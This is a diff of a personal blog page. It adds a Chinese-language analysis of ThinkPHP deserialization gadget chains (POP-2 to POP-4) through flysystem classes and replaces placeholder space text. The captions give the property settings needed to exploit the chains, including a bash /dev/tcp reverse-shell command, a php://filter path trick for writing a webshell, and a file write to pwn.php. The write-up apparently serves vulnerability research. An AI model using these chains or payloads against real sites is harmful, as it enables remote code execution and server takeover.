@@ -8,7 +8,7 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>BLOG OF SEVENTEEN</title>
+    <title>Blog Of SEVENTEEN</title>
 
     <link rel = "Shortcut Icon" href="../img/favicon.ico">
 
@@ -252,10 +252,81 @@
 
                 <p>&nbsp;&nbsp;&nbsp;利用链如下:</p>
 
+                <div>
+                	
+<pre class='hljs'><code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache<span class="hljs-class">.php</span>::__destruct()
+
+/vendor/topthink/framework/src/think/filesystem/CacheStore<span class="hljs-class">.php</span>::<span class="hljs-function"><span class="hljs-title">save</span><span class="hljs-params">()</span></span>
+
+/vendor/topthink/framework/src/think/cache/driver<span class="hljs-class">.php</span>::<span class="hljs-function"><span class="hljs-title">set</span><span class="hljs-params">()</span></span>
+
+/vendor/topthink/framework/src/think/cache/driver<span class="hljs-class">.php</span>::<span class="hljs-function"><span class="hljs-title">serialize</span><span class="hljs-params">()</span></span>
+</code></pre>
+                	
+                </div>
+                
+                <p>&nbsp;&nbsp;&nbsp;搜索全局__destruct()方法，找到/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</p>
+                
                 <a href="#">
-                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-1.jpg" alt="">
                 </a>
                 
+                <span class="caption text-muted">令$autosave = false</span>
+                
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;因为AbstractCache为抽象类，所以找一下它的子类</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-2.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;看到子类CacheStore中的save方法</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-3.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$cache = ['`bash -i >& /dev/tcp/ip/port 0>&1`']</span>
+
+								<p>&nbsp;&nbsp;&nbsp;查看cleanContents调用情况，只要不是嵌套数组，就可以直接return回来</p>
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-4.jpg" alt="">
+                </a>
+								
+								<p>&nbsp;&nbsp;&nbsp;返回json编码后的数据，进入set方法。
+									在条件足够利用的情况下，坚持能不进就不进原则。绕过第一个if语句，进入getCacheKey($name)方法。</p>
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-6.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->expire = 'expire'</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;$this->options = ['hash_type']不能为空，别问我怎么知道的。
+                	接着，返回进去serialize($value)方法</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-7.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->options = ['hash_type' => 'md5']</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;这里利用点其实就是$fun($value)，$fun跟$value都可控，谁让PHP是世界上最好都语言呢？
+                	不过需要注意的是这里的$value是json编码后的数组，用的是linux下反引号执行。
+                	选择反弹shell是因为这里会因为[]"这几个符号报错，无法回显ls这类指令的输出。
+                	当然，我一开始用trim测试去掉[]"这几个符号，但还是行不通。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-2-8.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->options = ['serialize' => ['system']]</span>
+
 
                 <p>&nbsp;&nbsp;&nbsp;POC-2如下:</p>
 
@@ -337,11 +408,49 @@
 
                 <h2 class="section-heading">POP-3</h2>
 
-                <p>&nbsp;&nbsp;&nbsp;利用链如下:</p>
+                <p>&nbsp;&nbsp;&nbsp;利用链与POP-2的一样，只不过用的是serialize($value)方法下面的
+                	$result = file_put_contents($filename, $data)来写入shell。
+                	我觉得你也跟我一样懒，所以我在这也贴一次。</p>
+                	
+                	<div>
+                	
+<pre class='hljs'><code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache<span class="hljs-class">.php</span>::__destruct()
 
-                <a href="#">
-                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+/vendor/topthink/framework/src/think/filesystem/CacheStore<span class="hljs-class">.php</span>::<span class="hljs-function"><span class="hljs-title">save</span><span class="hljs-params">()</span></span>
+
+/vendor/topthink/framework/src/think/cache/driver<span class="hljs-class">.php</span>::<span class="hljs-function"><span class="hljs-title">set</span><span class="hljs-params">()</span></span>
+
+/vendor/topthink/framework/src/think/cache/driver<span class="hljs-class">.php</span>::<span class="hljs-function"><span class="hljs-title">serialize</span><span class="hljs-params">()</span></span>
+</code></pre>
+                	
+                </div>
+                
+                <p>&nbsp;&nbsp;&nbsp;既然有file_put_contents()函数，那么肯定要康康文件名跟内容参数怎么控制啦!</p>
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-3-1.jpg" alt="">
                 </a>
+								
+								<p>&nbsp;&nbsp;&nbsp;查看$this->getCacheKey($name)的调用情况，还是那个能不进就不进原则。
+									更何况这里两个if已经对我们文件名动手动脚的了（诶，有if我就不进，就是玩儿），
+									这里options['path']用伪协议，是因为写入内容拼接了exit，具体康康p神那篇伪协议文章。</p>
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-3-2.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->options = ['cache_subdir' => false,
+                	'prefix' => '',
+                	'path' => 'php://filter/write=convert.base64-decode/resource=',
+                	'hash_type' => 'md5']</span>
+                	
+                <p>&nbsp;&nbsp;&nbsp;这里要记得文件名跟加密方式，这里我用的是md5加密后的17man，
+                	然后文件内容要加3个字符，因为base64编码4个字符一组。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-3-3.jpg" alt="">
+                </a>
+                    
 
                 <p>&nbsp;&nbsp;&nbsp;POC-3如下:</p>
 
@@ -424,10 +533,63 @@
                 <h2 class="section-heading">POP-4</h2>
 
                 <p>&nbsp;&nbsp;&nbsp;利用链如下:</p>
+								
+								<div>
+									
+									<pre class='hljs'><code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache<span class="hljs-class">.php</span>::__destruct()
 
+/vendor/league/flysystem-cached-adapter/src/Storage/Adapter<span class="hljs-class">.php</span>::<span class="hljs-function"><span class="hljs-title">save</span><span class="hljs-params">()</span></span>
+
+/vendor/league/flysystem/src/Adapter/Local<span class="hljs-class">.php</span>:<span class="hljs-function"><span class="hljs-title">has</span><span class="hljs-params">()</span></span>
+
+/vendor/league/flysystem/src/Adapter/Local<span class="hljs-class">.php</span>:<span class="hljs-function"><span class="hljs-title">write</span><span class="hljs-params">()</span></span></code></pre>
+									
+								</div>	
+								
+								<p>&nbsp;&nbsp;&nbsp;触发点位于League\Flysystem\Cached\Storage\AbstractCache::__destruct()</p>
+								
+						
                 <a href="#">
-                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-4-1.jpg" alt="">
                 </a>
+                
+                <span class="caption text-muted">令$autosave = false</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;AbstractCache为抽象类，找一下它的子类Adapter利用</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-4-2.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$autosave = false</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;看一下Adapter中的save()方法中，有一个write方法。$content为getForStorage方法返回值，
+                	上文分析了该参数可控，所以可以用来写马。
+                	我们只需要找到有has()跟write()方法的对象来利用。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-4-3.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$cache = ['&lt;?php phpinfo();?>']，$this->adapter = $obj</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;查看has()方法的调用情况，发现该方法用来判断文件是否已存在，
+                	只要构建文件名不存在即可</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-4-4.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->file = 'pwn.php'</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;执行file_put_contents()函数，写入shell</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-4-5.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted"></span>
+
 
                 <p>&nbsp;&nbsp;&nbsp;POC-4如下:</p>
 
@@ -492,57 +654,14 @@
                 </div>
 
 
-
-                <p>A Chinese tale tells of some men sent to harm a young girl who, upon seeing her beauty, become her
-                    protectors rather than her violators. That's how I felt seeing the Earth for the first time. I could
-                    not help but love and cherish her.</p>
-
-                <p>For those who have seen the Earth from space, and for the hundreds and perhaps thousands more who
-                    will, the experience most certainly changes your perspective. The things that we share in our world
-                    are far more valuable than those which divide us.</p>
-
-                <h2 class="section-heading">POP1</h2>
-
-                <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it
-                    is a task to occupy the generations. And no matter how much progress one makes, there is always the
-                    thrill of just beginning.</p>
-
-                <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it
-                    is a task to occupy the generations. And no matter how much progress one makes, there is always the
-                    thrill of just beginning.</p>
-
-                <blockquote class="blockquote">The dreams of yesterday are the hopes of today and the reality of
-                    tomorrow. Science has not yet mastered prophecy. We predict too much for the next year and yet far
-                    too little for the next ten.
-                </blockquote>
-
-                <p>Spaceflights cannot be stopped. This is not the work of any one man or even a group of men. It is a
-                    historical process which mankind is carrying out in accordance with the natural laws of human
-                    development.</p>
-
-                <h2 class="section-heading">POP2</h2>
-
-                <h2 class="section-heading">POP3</h2>
-                <p>As we got further and further away, it [the Earth] diminished in size. Finally it shrank to the size
-                    of a marble, the most beautiful you can imagine. That beautiful, warm, living object looked so
-                    fragile, so delicate, that if you touched it with a finger it would crumble and fall apart. Seeing
-                    this has to change a man.</p>
-
-                <a href="#">
+								<a href="#">
                     <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
                 </a>
-                <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about.</span>
+                <span class="caption text-muted">Turn at the next intersection.</span>
 
-                <p>Space, the final frontier. These are the voyages of the Starship Enterprise. Its five-year mission:
-                    to explore strange new worlds, to seek out new life and new civilizations, to boldly go where no man
-                    has gone before.</p>
+                <blockquote class="blockquote">
+                </blockquote>
 
-                <p>As I stand out here in the wonders of the unknown at Hadley, I sort of realize there’s a fundamental
-                    truth to our nature, Man must explore, and this is exploration at its greatest.</p>
-
-                <p>Placeholder text by
-                    <a href="http://spaceipsum.com/">Space Ipsum</a>. Photographs by
-                    <a href="https://www.flickr.com/photos/nasacommons/">NASA on The Commons</a>.</p>
             </div>
         </div>
     </div>
